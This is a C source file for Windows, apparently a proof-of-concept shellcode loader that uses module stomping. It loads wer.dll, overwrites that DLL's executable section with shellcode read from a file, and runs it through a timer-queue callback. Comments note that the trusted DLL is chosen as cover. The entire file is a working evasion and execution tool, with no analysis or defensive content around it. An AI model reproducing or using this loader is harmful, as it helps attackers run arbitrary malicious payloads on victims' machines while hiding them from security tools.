#include <windows.h>
#include <stdio.h>
#include <winnt.h>

// Function to perform module stomping and execute via timer callback
BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <path_to_shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read shellcode from file
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        perror("[-] Failed to open shellcode file");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
    if (!shellcode) {
        perror("[-] Failed to allocate memory for shellcode");
        fclose(fp);
        return 1;
    }

    size_t bytes_read = fread(shellcode, 1, shellcode_size, fp);
    if (bytes_read != shellcode_size) {
        perror("[-] Failed to read shellcode file completely");
        free(shellcode);
        fclose(fp);
        return 1;
    }
    fclose(fp);

    printf("[+] Shellcode read from %s (%zu bytes)\n", argv[1], shellcode_size);

    // Perform module stomping and indirect execution
    if (!ModuleStompAndExecute(shellcode, shellcode_size)) {
        printf("[-] Module stomping and execution failed.\n");
        free(shellcode);
        return 1;
    }

    printf("[+] Module stomping and timer creation successful. Waiting for shellcode to execute...\n");
    free(shellcode);
    return 0;
}

BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size) {
    // 1. Load a legitimate but less-critical DLL. wer.dll (Windows Error Reporting) is a good candidate.
    const char* target_module = "wer.dll";
    HMODULE hModule = LoadLibraryA(target_module);
    if (hModule == NULL) {
        printf("[-] Failed to load %s. Error: %lu\n", target_module, GetLastError());
        return FALSE;
    }
    printf("[+] Loaded %s at base address: 0x%p\n", target_module, (void*)hModule);

    // 2. Parse PE headers to find the .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER textSection = NULL;

    // Iterate through sections to find the first executable one (usually .text)
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            textSection = sectionHeader;
            printf("[+] Found executable section '%s' at RVA 0x%X\n", textSection->Name, textSection->VirtualAddress);
            break;
        }
        sectionHeader++;
    }

    if (textSection == NULL) {
        printf("[-] Could not find an executable section.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    // 3. Check if the section is large enough for our shellcode
    if (textSection->SizeOfRawData < shellcode_size) {
        printf("[-] Executable section is too small (%u bytes) for the shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
        FreeLibrary(hModule);
        return FALSE;
    }
    printf("[+] Section size (%u bytes) is sufficient for shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
    
    LPVOID textSectionAddress = (LPVOID)((LPBYTE)hModule + textSection->VirtualAddress);

    // 4. Change memory permissions to RW
    DWORD oldProtect;
    if (!VirtualProtect(textSectionAddress, shellcode_size, PAGE_READWRITE, &oldProtect)) {
        printf("[-] Failed to change memory permissions to RW. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }
    printf("[+] Changed memory permissions to PAGE_READWRITE.\n");

    // 5. Copy the shellcode into the section
    memcpy(textSectionAddress, shellcode, shellcode_size);
    printf("[+] Copied shellcode to target section.\n");

    // 6. Restore memory permissions to RX
    if (!VirtualProtect(textSectionAddress, shellcode_size, oldProtect, &oldProtect)) {
        printf("[-] Failed to restore memory permissions. Error: %lu\n", GetLastError());
        // This is not ideal, but we can try to continue
    }
    printf("[+] Restored memory permissions.\n");

    // 7. Execute the shellcode indirectly using a timer queue callback
    printf("[*] Creating timer queue to execute shellcode...\n");
    HANDLE hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        printf("[-] Failed to create timer queue. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }

    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)textSectionAddress, NULL, 100, 0, WT_EXECUTEINTIMERTHREAD)) {
        printf("[-] Failed to create timer queue timer. Error: %lu\n", GetLastError());
        DeleteTimerQueue(hTimerQueue);
        FreeLibrary(hModule);
        return FALSE;
    }

    // The main thread must wait for the callback to execute.
    // A long sleep is a simple way to achieve this for a PoC.
    // In a real scenario, more robust synchronization would be used.
    printf("[+] Timer created. Main thread will sleep for 10 seconds to allow callback execution.\n");
    Sleep(10000);

    // Cleanup
    // Note: If the shellcode is successful (e.g., spawns a new process and exits),
    // this cleanup code might not be reached.
    printf("[+] Cleaning up resources.\n");
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    FreeLibrary(hModule);

    return TRUE;
}